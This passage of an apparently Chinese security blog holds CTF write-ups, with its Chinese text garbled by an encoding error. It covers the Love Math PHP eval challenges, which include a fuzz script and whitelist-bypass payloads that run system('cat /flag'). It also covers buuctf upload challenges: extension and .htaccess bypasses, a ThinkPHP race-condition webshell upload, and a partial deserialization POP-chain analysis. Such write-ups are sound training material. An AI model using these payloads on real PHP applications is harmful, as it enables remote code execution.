class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="å®¡è®¡">å®¡è®¡</h4>
<p>å¯ä»¥çœ‹åˆ°ä»£ç å¯¹äºæˆ‘ä»¬çš„ä¼ å‚è¿›è¡Œäº†å¦‚ä¸‹é™åˆ¶ï¼š</p>
<ol>
<li>
<p>é•¿åº¦é™åˆ¶&lt;80</p>
</li>
<li>
<p>é»‘åå•ç‰¹æ®Šå­—ç¬¦é™åˆ¶</p>
</li>
<li>
<p>æ­£åˆ™åŒ¹é…å­—ç¬¦é€šè¿‡ç™½åå•éªŒè¯ï¼Œæ¯”å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(1)èƒ½è¿‡</span><br><span class="line">1abs()èƒ½è¿‡</span><br><span class="line">absa()ä¸èƒ½è¿‡</span><br><span class="line">abs(a)ä¸èƒ½è¿‡</span><br><span class="line">abs()aä¸èƒ½è¿‡</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>å…¶ä¸­æ­£åˆ™åŒ¹é…å­—ç¬¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs); </span><br></pre></td></tr></table></figure>
<p>æ˜¯å°†<code>$content</code>å˜é‡ä¸­ä»¥å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²ç»„æˆæ•°ç»„å‚¨å­˜åœ¨<code>$used_funcs</code>å˜é‡ä¸­ã€‚</p>
<p>æŸ¥çœ‹<code>$whitelist</code>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªè¿›åˆ¶è½¬æ¢å‡½æ•°ï¼š</p>
<blockquote>
<ul>
<li>base_convert()ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ï¼ˆ2 - 32 è¿›åˆ¶)ã€‚</li>
<li>dechex()ï¼šæŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚</li>
</ul>
</blockquote>
<p>æˆ‘ä»¬çŸ¥é“<code>32è¿›åˆ¶</code>åŒ…æ‹¬<code>0-9a-z</code>ç­‰å­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>base_convert()</code>å‡½æ•°åˆ©ç”¨è¿›åˆ¶è½¬æ¢æ„é€ ç‰¹å®šçš„å­—ç¬¦ä¸²ã€‚</p>
<h4 id="æ„é€ payload">æ„é€ payload</h4>
<h5 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</h5>
<p>ç”±äºé•¿åº¦çš„é™åˆ¶ï¼Œè‚¯å®šæ˜¯è¦æ„é€ <code>&#123;$_GET&#125;&#123;xx&#125;(&#123;$_GET&#125;&#123;yy&#125;)</code>æ¥æ‰§è¡Œshellã€‚</p>
<blockquote>
<p><code>hex2bin() å‡½æ•°</code>ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</p>
</blockquote>
<p>é¦–å…ˆæŠŠ<code>$_GET</code>è½¬æ¢ä¸º10è¿›åˆ¶è¡¨ç¤ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(binascii.b2a_hex(<span class="string">b&#x27;_GET&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="number">1598506324</span></span><br></pre></td></tr></table></figure>
<p>å†åˆ©ç”¨<code>base_convert</code>å‡½æ•°æ„é€ <code>hex2bin</code>å‡½æ•°ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703115033.png" style="zoom:67%;" />
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(base_convert(37907361743, 10, 36));</span><br><span class="line">string(7) &quot;hex2bin&quot;</span><br></pre></td></tr></table></figure>
<p>æœ€åï¼Œæˆ‘ä»¬å°±åˆ©ç”¨<code>dechex</code>å‡½æ•°æŠŠ10è¿›åˆ¶è¡¨ç¤ºçš„<code>$_GET</code>è½¬æ¢ä¸º16è¿›åˆ¶è¡¨ç¤ºï¼Œç„¶åä¼ å…¥<code>hex2bin()</code>å‡½æ•°ã€‚</p>
<p>æ‰€ä»¥æœ€åçš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å¦å¤–ä¸€ç§å½¢å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$&#123;$pi&#125;&#123;pi&#125;($&#123;$pi&#125;&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</h5>
<p>é€šè¿‡<code>getallheaders()</code>å‡½æ•°ï¼Œè¯»å–å†™å…¥HTTP request headerå­—æ®µçš„å€¼ã€‚</p>
<p>payloadçš„æ„é€ æ–¹å¼å’Œä¸Šé¢ä¸€æ ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure>
<p>è§£é‡Šå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(696468,10,36) &#x3D;&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) &#x3D;&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br><span class="line">&#x2F;&#x2F;æ“ä½œxxå’Œyyï¼Œä¸­é—´ç”¨é€—å·éš”å¼€ï¼Œechoéƒ½èƒ½è¾“å‡º</span><br><span class="line">echo xx,yy</span><br></pre></td></tr></table></figure>
<h2 id="NESTCTF2019-Love-Math2">NESTCTF2019 Love Math2</h2>
<h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3>
<ul>
<li>ä»£ç å®¡è®¡</li>
<li>Fuzz</li>
</ul>
<h3 id="è§£é¢˜-v9">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å’Œä¸Šé¢çš„é‚£é“é¢˜åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯é™åˆ¶æ›´ä¸ºä¸¥æ ¼ï¼Œå‚æ•°é•¿åº¦å¿…é¡»å°äº60ï¼Œæ‰€ä»¥é‚£é“é¢˜çš„ä¸¤ä¸ªæ–¹æ³•éƒ½ä¸èƒ½ç”¨ï¼Œè¿™é‡Œå†ä»‹ç»ä¸€ç§Fuzzçš„è„šæœ¬ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">echo</span>($payload[$k].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦ç›®çš„å°±æ˜¯æƒ³fuzzå‡º<code>_GET</code>å­—ç¬¦ä¸²ã€‚å¯ä»¥æŠŠè¿™ä¸ªå­—ç¬¦ä¸²æ‹†åˆ†æˆä¸¤æ®µã€‚å…ˆæŸ¥æ‰¾<code>_G</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php fuzz.php | grep _G</span><br><span class="line">is_finite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_infinite^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">is_nan^64&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_getrandmax^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_rand^23&#x3D;&#x3D;&gt;_G</span><br><span class="line">mt_srand^23&#x3D;&#x3D;&gt;_G</span><br></pre></td></tr></table></figure>
<p>å†æ¥æŸ¥æ‰¾<code>ET</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php fuzz.php | grep ET</span><br><span class="line">rad2deg^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">rand^75&#x3D;&#x3D;&gt;ET</span><br><span class="line">tan^15&#x3D;&#x3D;&gt;ET</span><br><span class="line">tanh^15&#x3D;&#x3D;&gt;ET</span><br></pre></td></tr></table></figure>
<p>é€‰æ‹©å‡½æ•°åæœ€çŸ­çš„å³å¯ã€‚æœ€ç»ˆçš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æˆ–è€…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>å‘½ä»¤æ‰§è¡Œ</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶ä¸Šä¼ </title>
    <url>/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload">æå®¢å¤§æŒ‘æˆ˜ 2019 Upload</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>phtmlç»•è¿‡åç¼€</li>
<li>scriptç»•è¿‡&lt;?</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818233431.png" alt=""></p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload">ACTF2020 æ–°ç”Ÿèµ› Upload</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>phtmlåç¼€ç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818232047.png" alt=""></p>
<h2 id="GXYCTF2019-BabyUpload">GXYCTF2019 BabyUpload</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>.htaccessè§£æç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819085908.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819090013.png" alt=""></p>
<h2 id="RoarCTF-2019-SimpleUpload">RoarCTF 2019 SimpleUpload</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>æ¡ä»¶ç«äº‰</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p>æ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯ThinkPHP3.2.4ç‰ˆæœ¬ï¼Œä»GitHubä¸Šä¸‹è½½ä¸‹æ¥å®¡è®¡ä¸€ä¸‹ï¼Œå‘ç°ä¸Šä¼ æ¨¡å—æœ‰ä¸€ä¸ªé—®é¢˜ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819104409.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·æ‰€å†™å¾—ä»£ç ä½¿ç”¨æ—¶æœªæŒ‡å®šfilesï¼Œé»˜è®¤ä¸º<code>$_FILES</code>ï¼Œè¿™æ„å‘³ç€ï¼Œæ‰€æœ‰<code>$_FILES</code>ä¸­çš„æ–‡ä»¶éƒ½ä¼šè¢«ä¸Šä¼ ã€‚è€Œä»£ç åªä¼šè¿‡æ»¤<code>$_FILES['file']</code>ä¸­çš„æ–‡ä»¶ã€‚æ‰€ä»¥ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªnameä¸ºfileçš„æ­£å¸¸å›¾ç‰‡ï¼Œå¦ä¸€ä¸ªnameä¸ºå…¶ä»–çš„webshellã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>æœ€åä¼šæ‰“å°å‡º<code>$_FILES['file']</code>çš„æ–‡ä»¶åœ°å€ï¼Œè€Œä¸ä¼šæ‰“å°æˆ‘ä»¬shellçš„åœ°å€ã€‚</p>
<p>ThinkPHP3é»˜è®¤ä½¿ç”¨uniqid()å‡½æ•°æ ¹æ®æ—¶é—´ç”Ÿæˆæ–‡ä»¶åï¼Œä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶é—´ç›¸è¿‘å¯ä»¥çˆ†ç ´ã€‚</p>
<p>æœ€åä¸Šä¼ çš„phpä¼šè¢«åå°æ›¿æ¢æˆflagã€‚</p>
<h2 id="å¼ºç½‘æ¯-2019-Upload">å¼ºç½‘æ¯ 2019 Upload</h2>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>PHPååºåˆ—åŒ–POPé“¾æ„é€ </li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<p>æ³¨å†Œä¹‹åæŸ¥çœ‹cookieå‘ç°æ˜¯ä¸€ä¸ªbase64ç¼–ç åçš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:5:&quot;email&quot;;s:15:&quot;admin@admin.com&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:3:&quot;img&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰«ç›®å½•å¾—åˆ° <code>www.tar.gz</code> å‹ç¼©åŒ…ï¼Œä»£ç å®¡è®¡</p>
<p>ç”¨PHPStormæ‰“å¼€ä¼šå‘ç°æœ‰ä¸¤ä¸ªæ–­ç‚¹ï¼Œåº”è¯¥æ˜¯ç»™çš„hint</p>
<p><code>Register.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164356.png" alt=""></p>
<p><code>Index.php</code>ä¸­æœ‰ä¸€ä¸ªæŠŠcookieååºåˆ—åŒ–çš„åœ°æ–¹ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724164417.png" alt=""></p>
<p>è¿™ä¹ˆæ¥çœ‹åº”è¯¥æ˜¯æ„é€ ååºåˆ—åŒ–çš„POPé“¾ã€‚</p>
<p>åœ¨<code>Profile.php</code>å‘ç°å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè‚¯å®šæ˜¯åˆ©ç”¨<code>__call</code>å‡½æ•°å»æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤äº†ã€‚</p>
<p>æ„é€ POPé“¾å…ˆæ‰¾<code>__destruct</code>æ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾åˆšåˆš<code>Register.php</code>ä¸­å°±æœ‰ææ„å‡½æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>Register-&gt;checker = Profile</code>ï¼Œåˆ©ç”¨<code>Profile-&gt;index()</code>å»è§¦å‘<code>Profile</code>ç±»ä¸­çš„<code>__call</code>é­”æœ¯æ–¹æ³•ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>Profile.php</code>å½“ä¸­çš„<code>__call</code>æ–¹æ³•è°ƒç”¨çš„å‚æ•°æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name, $arguments</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æ–‡æ¡£æˆ‘ä»¬å¯ä»¥çŸ¥é“<code>$name</code>æ˜¯ä¸å­˜åœ¨æ–¹æ³•çš„è°ƒç”¨çš„åå­—ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯<code>index</code>ï¼Œ<code>$arguments</code>å°±æ˜¯ä¼ å…¥è°ƒç”¨æ–¹æ³•çš„å‚æ•°ï¼Œè¿™é‡Œå°±ä¸ºç©ºã€‚</p>
<p>è€Œå½“ä½¿ç”¨<code>$this-&gt;index</code>çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šè§¦å‘å¦ä¸€ä¸ªé­”æœ¯æ–¹æ³•<code>__get</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œåˆè°ƒç”¨äº†<code>$this-&gt;except[$name]</code>ï¼Œè€Œ<code>$name</code>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>__call</code>è°ƒç”¨çš„å€¼ç¡®å®šä¸º<code>index</code>ï¼Œè€Œä¸”<code>Profile</code>ç±»å­˜åœ¨ä¸€ä¸ªå…¬æœ‰ç±»<code>except</code>å¯ä»¥ä¾›æˆ‘ä»¬ä¿®æ”¹ã€‚</p>
<p>æ¥ç€åˆ©ç”¨<code>_get</code>çš„è¿”å›ä¼šä½¿<code>__call</code>æ–¹æ³•ä¸­çš„<code>if</code>ä¸ºçœŸï¼Œæ‰§è¡Œ<code>$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</code>ã€‚</p>
<p>æœ‰äº†POPé“¾ä¹‹åï¼Œæˆ‘ä»¬åº”è¯¥å»è°ƒç”¨ä»€ä¹ˆå‡½æ•°å‘¢ï¼Œæ¥ç€çœ‹<code>Profile.php</code></p>
